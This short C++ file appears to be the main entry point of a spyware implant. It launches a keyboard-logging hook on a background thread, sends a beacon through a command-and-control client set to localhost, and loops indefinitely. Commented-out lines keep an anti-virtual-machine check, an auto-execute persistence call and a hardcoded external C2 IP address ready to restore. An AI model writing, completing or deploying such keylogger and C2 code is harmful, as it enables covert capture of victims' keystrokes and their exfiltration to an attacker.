#include "cncManager.h"
#include "commandManager.h"
#include "keyLogger.h"
#include "initialize.h"

#include <stdlib.h>
#include <iostream>
#include <string>   
#include <thread>

//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow){
int main() {
    
    //if (Anti_VM()) {
    if (true) {
        //autoExecute();
        //cncManager client(L"1.251.227.66");

        cncManager client(L"127.0.0.1");

        keyLogger logger;

        std::thread keyLog = std::thread(&keyLogger::startHook, logger);
        keyLog.detach();

        client.print_setting = true;
        client.sendBeacon();


        while (TRUE) {
            //std::cout << "thread test" << std::endl;
            Sleep(1000);
        }
    }
    else {
        std::cout << "VM DETECTED ! " << std::endl;
    }
}
